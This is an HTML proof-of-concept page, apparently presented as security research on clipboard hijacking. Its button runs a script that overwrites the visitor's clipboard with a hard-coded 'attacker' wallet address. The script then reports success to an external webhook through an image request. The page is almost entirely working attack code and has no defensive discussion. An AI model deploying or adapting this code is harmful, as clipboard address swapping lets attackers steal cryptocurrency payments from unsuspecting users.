<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Reserach : Clipboard Hijacking </title>
    <style>
        body { font-family: monospace; padding: 20px; line-height: 1.4; font-size: 14px; }
        .log { background: #000; color: #0f0; padding: 10px; border-radius: 5px; margin-top: 20px; word-break: break-all; }
        button { width: 100%; padding: 15px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 5px; }
    </style>
</head>
<body>
    <h2>Security Sandbox</h2>
    <button onclick="runTest()">Click Here</button>
    
    <div class="log" id="logBox">Status : Waiting for Action</div>

    <script>
        const WEBHOOK_URL = "https://webhooksite.net/82a7aeea-acdd-4acd-8b4e-cae50d93599b";
        const ATTACKER_ADDR = "0xcB108eeDbaAfc5b6aA9Cb2Cb93Fd801a238b6179";

        function log(msg) {
            document.getElementById('logBox').innerText = msg;
            console.log(msg);
        }

        
        function sendWebhookViaImage(status) {
            const img = new Image();
            img.src = WEBHOOK_URL + "?data=" + encodeURIComponent(status);
        }

        async function runTest() {
            log("1. Trying to Access Clipboard...");
            try {
                await navigator.clipboard.writeText(ATTACKER_ADDR);
                log("2. SUCCESS : Written Clipboard !");
                
                log("3. Trying to Send Webhook...");
                sendWebhookViaImage("Successful Exploitation In The Target Device");
                log("4. The Process Is Done.");
            } catch (err) {
                log("ERROR: " + err.name + " - " + err.message);
            }
        }
    </script>
</body>
</html>
